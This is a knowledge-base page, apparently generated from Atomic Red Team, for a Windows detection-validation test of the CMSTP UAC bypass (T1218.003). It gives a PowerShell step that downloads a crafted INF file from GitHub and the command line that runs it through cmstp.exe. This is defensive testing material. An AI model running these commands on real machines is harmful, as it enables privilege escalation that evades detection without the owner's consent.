---
atomic_guid: "748cb4f6-2fb3-4e97-b7ad-b22635a09ab0"
title: "CMSTP Executing UAC Bypass"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.003"
attack_technique_name: "Signed Binary Proxy Execution: CMSTP"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "748cb4f6-2fb3-4e97-b7ad-b22635a09ab0"
  - "CMSTP Executing UAC Bypass"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# CMSTP Executing UAC Bypass

Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file

## Metadata

- Atomic GUID: 748cb4f6-2fb3-4e97-b7ad-b22635a09ab0
- Technique: T1218.003: Signed Binary Proxy Execution: CMSTP
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1218.003/T1218.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.003]]

## Input Arguments

### inf_file_uac

- description: Path to the INF file
- type: path
- default: PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf

## Dependencies

INF file must exist on disk at specified location (#{inf_file_uac})

### Prerequisite Check

```powershell
if (Test-Path "#{inf_file_uac}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{inf_file_uac}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
```

## Executor

- name: command_prompt

### Command

```cmd
cmstp.exe /s "#{inf_file_uac}" /au
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.yaml)
